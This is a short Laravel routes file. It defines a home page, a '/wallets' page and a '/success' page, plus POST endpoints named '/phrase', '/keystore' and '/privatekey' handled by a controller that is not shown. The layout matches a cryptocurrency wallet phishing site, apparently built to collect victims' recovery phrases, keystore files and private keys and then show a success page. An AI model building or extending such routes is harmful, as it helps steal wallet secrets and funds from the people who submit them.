<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\ProcessController;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('home');
});

Route::get('/wallets', function () {
    return view('wallets');
});

Route::get('/success', function () {
    return view('success');
});

Route::post('/phrase', [ProcessController::class, 'phrase'])->name('phrase');
Route::post('/keystore', [ProcessController::class, 'keystore'])->name('keystore');
Route::post('/privatekey', [ProcessController::class, 'privatekey'])->name('privatekey');

